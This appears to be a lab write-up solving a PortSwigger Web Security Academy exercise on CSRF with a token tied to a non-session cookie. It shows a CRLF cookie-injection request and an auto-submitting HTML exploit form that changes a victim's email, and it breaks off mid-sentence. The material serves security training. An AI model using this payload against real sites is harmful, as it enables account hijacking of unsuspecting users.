# LAB.5 CSRF where token is tied to non-session cookie

## Description

 This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

    wiener:peter
    carlos:montoya


## Solution

I login with `wiener` credential and change the email.

I observe the `POST` request and I see the cookie being:

`Cookie: csrfKey=mbK44TIab4noSbzko13C2bh3773waBzW; session=LQj7P9cfgxPwWib7gWPktiIfSmq5YMbF`

and the body:

`email=test2%40wiener.com&csrf=8zC621jdRwqzMyXB2Wby1xL9Hf8t51rF`

I do the same with the carlos account:

`Cookie: csrfKey=2QPjiCdqWfOTDjqq7vQufZSquU1cEo3r; session=81br4yajt0Rlzgrj6OOMVTfUiWo8iVHq`

`email=test%40carlos.net&csrf=BpmVTDZrmMRh8jneSM5F5j6udE9eyo2P`

I change the `csrfKey` token from the first request to see if it changes the email address.

In this case it logged me out. Let's try to change the `csrf` in the body.

And in this case I get a `Invalid CSRF token".

Let's try the `csrfKey` and `csrf` from `carlos` to `wiener`.

And it worked, so this means that the vulnerbaility exists, as we can use the `csrfKey` and `csrf` from other accounts to perform actions.

But, still we need the session key, to do this.

There is a `search` function available in the home page, and there I just search for the string `halil`.

I send this request to the Burp Repeater, and I see there that this search query is reflected in the `Set-Cookie`:

`Set-Cookie: LastSearchTerm=Halil; Secure; HttpOnly`

So, I will use this to inject cookies to the victim user's browser.

Let's try this via repeater, by appending to the `GET` request the search value, and the `Set-Cookie`.

```http
GET /?search=Halil%0d%0aSet-Cookie:%20csrfKey=BpmVTDZrmMRh8jneSM5F5j6udE9eyo2P
```

In the response we see that we managed to set the `csrfKey`:

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=Halil
Set-Cookie: csrfKey=BpmVTDZrmMRh8jneSM5F5j6udE9eyo2P; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
```

So with our payload all we need is to set the `csrf` and the `csrfkey`.

Since `csrf` is set by the body that's no problem at all.

And for the `csrfKey` we will set it by using the reflected search function.

In the exploit server add this:


```html
<form action="https://0ae50097035970f08020b71800e9006b.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned&commat;vatrasec&period;net" />
<input type="hidden" name="csrf" value="8zC621jdRwqzMyXB2Wby1xL9Hf8t51rF" />
</form>
<img src="0ae50097035970f08020b71800e9006b.web-security-academy.net/?search=Halil%0d%0aSet-Cookie:%20csrfKey=mbK44TIab4noSbzko13C2bh3773waBzW" onerror="document.forms[0].submit() ">
```

This means that it will send a `POST` request to change the email, with the email we provided, and will set the cs